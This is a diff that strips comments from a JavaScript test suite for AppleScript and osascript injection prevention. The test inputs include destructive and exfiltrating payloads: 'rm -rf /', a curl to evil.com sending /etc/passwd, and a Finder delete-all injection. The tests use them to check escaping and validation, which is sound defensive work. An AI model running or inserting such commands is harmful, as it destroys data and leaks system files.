@@ -1,7 +1,3 @@
-/**
- * Security tests for AppleScript injection prevention
- * Tests sanitization of user inputs used in AppleScript commands
- */
 
 import { describe, it, expect } from 'vitest'
 import {
@@ -17,11 +13,9 @@ import {
 } from '../../../lib/mailWrite.js'
 
 describe('AppleScript Injection Prevention', () => {
-  // Simulated AppleScript sanitization function
   const sanitizeForAppleScript = (input) => {
     if (typeof input !== 'string') return ''
 
-    // Escape backslashes first, then quotes
     return input
       .replace(/\\/g, '\\\\')
       .replace(/"/g, '\\"')
@@ -29,7 +23,6 @@ describe('AppleScript Injection Prevention', () => {
       .replace(/\n/g, '\\n')
   }
 
-  // Simulated function to build AppleScript command safely
   const buildAppleScriptCommand = (messageId) => {
     const sanitized = sanitizeForAppleScript(messageId)
     return `tell application "Mail" to open message id "${sanitized}"`
@@ -88,13 +81,10 @@ describe('AppleScript Injection Prevention', () => {
 
   describe('injection attempts', () => {
     it('should prevent command injection via quotes', () => {
-      // Attacker tries to break out of quoted string and run command
       const maliciousInput = '" & do shell script "rm -rf /" & "'
       const result = sanitizeForAppleScript(maliciousInput)
 
-      // The quotes should be escaped, preventing injection
       expect(result).toBe('\\" & do shell script \\"rm -rf /\\" & \\"')
-      // All quotes are now escaped (\" not ")
       expect(result.startsWith('\\"')).toBe(true)
     })
 
@@ -102,8 +92,6 @@ describe('AppleScript Injection Prevention', () => {
       const maliciousInput = '"; do shell script "curl http://evil.com/steal?data=" & (read file "/etc/passwd") & "'
       const result = sanitizeForAppleScript(maliciousInput)
 
-      // All quotes escaped - check that raw unescaped quote sequences don't exist
-      // The result should have \\" not standalone "
       expect(result.startsWith('\\"')).toBe(true)
       expect(result.split('\\"').length).toBeGreaterThan(1)
     })
@@ -112,7 +100,6 @@ describe('AppleScript Injection Prevention', () => {
       const maliciousInput = '"\nend tell\ntell application "Finder" to delete every item of desktop\ntell application "Mail"\nset x to "'
       const result = sanitizeForAppleScript(maliciousInput)
 
-      // Newlines escaped, preventing multi-line injection
       expect(result.includes('\nend tell')).toBe(false)
       expect(result.includes('\\nend tell')).toBe(true)
     })
@@ -121,7 +108,6 @@ describe('AppleScript Injection Prevention', () => {
       const maliciousInput = '" & keystroke "a" using command down & "'
       const result = sanitizeForAppleScript(maliciousInput)
 
-      // All quotes should be escaped
       expect(result.startsWith('\\"')).toBe(true)
       expect(result.endsWith('\\"')).toBe(true)
     })
@@ -153,18 +139,14 @@ describe('AppleScript Injection Prevention', () => {
       const maliciousId = '" & do shell script "whoami" & "'
       const command = buildAppleScriptCommand(maliciousId)
 
-      // Should contain escaped quotes, preventing injection
       expect(command).toContain('\\"')
-      // The command should still be properly wrapped - quotes in ID are escaped
       expect(command.startsWith('tell application "Mail"')).toBe(true)
     })
   })
 
   describe('osascript command building', () => {
     const buildOsascriptCommand = (script) => {
-      // In real code, we'd escape for shell as well
       const shellEscape = (str) => {
-        // Single quotes in shell: replace ' with '\''
         return `'${str.replace(/'/g, "'\\''")}'`
       }
 
@@ -182,10 +164,7 @@ describe('AppleScript Injection Prevention', () => {
       const maliciousScript = "'; rm -rf /; echo '"
       const command = buildOsascriptCommand(maliciousScript)
 
-      // Single quotes should be escaped with '\'' pattern
-      // This breaks the string: close quote, escaped quote, reopen quote
       expect(command).toContain("'\\''")
-      // The command should wrap the script properly
       expect(command.startsWith("osascript -e '")).toBe(true)
     })
   })
@@ -195,8 +174,6 @@ describe('AppleScript Injection Prevention', () => {
       if (typeof id !== 'string') return false
       if (id.length === 0 || id.length > 500) return false
 
-      // Message IDs should only contain safe characters
-      // RFC 2822 msg-id format: printable ASCII except some special chars
       const safePattern = /^[a-zA-Z0-9@.<>\-_+=]+$/
       return safePattern.test(id)
     }
@@ -256,8 +233,6 @@ describe('AppleScript Injection Prevention', () => {
     const sanitizeContactId = (id) => {
       if (typeof id !== 'string') return ''
 
-      // Remove any characters that could be problematic
-      // Only allow alphanumeric, @, ., -, _, +, and spaces
       return id.replace(/[^a-zA-Z0-9@.\-_+ ]/g, '')
     }
 
@@ -291,13 +266,10 @@ describe('AppleScript Injection Prevention', () => {
     const isValidMessageURL = (url) => {
       if (typeof url !== 'string') return false
 
-      // Only allow message:// URLs with safe characters
       if (!url.startsWith('message://')) return false
 
       const path = url.slice('message://'.length)
 
-      // Path should only contain URL-safe characters
-      // Specifically: alphanumeric, -, _, ., ~, %, @, <, >
       const safePattern = /^[a-zA-Z0-9\-_.~%@<>]+$/
       return safePattern.test(path)
     }
@@ -336,8 +308,6 @@ describe('AppleScript Injection Prevention', () => {
     const sanitizeCalendarId = (id) => {
       if (typeof id !== 'string') return ''
 
-      // Calendar IDs are typically UUIDs or similar
-      // Only allow alphanumeric, dashes, and underscores
       return id.replace(/[^a-zA-Z0-9\-_]/g, '')
     }
 
@@ -360,10 +330,8 @@ describe('AppleScript Injection Prevention', () => {
     const sanitizeFilePath = (path) => {
       if (typeof path !== 'string') return ''
 
-      // First convert backslashes to forward slashes (POSIX style)
       let posixPath = path.replace(/\\/g, '/')
 
-      // Then escape quotes and colons (AppleScript path separator)
       return posixPath
         .replace(/"/g, '\\"')
         .replace(/:/g, '\\:')
@@ -387,7 +355,6 @@ describe('AppleScript Injection Prevention', () => {
       const path = 'C:\\Users\\test\\file.txt'
       const result = sanitizeFilePath(path)
 
-      // Backslashes converted to forward slashes
       expect(result).toBe('C\\:/Users/test/file.txt')
     })
   })
@@ -429,7 +396,6 @@ describe('AppleScript Injection Prevention', () => {
         if (!ALLOWED_VERBS.includes(verb)) return false
         if (typeof target !== 'string' || target.length === 0) return false
 
-        // Target should not contain newlines or control characters
         if (/[\x00-\x1f]/.test(target)) return false
 
         return true
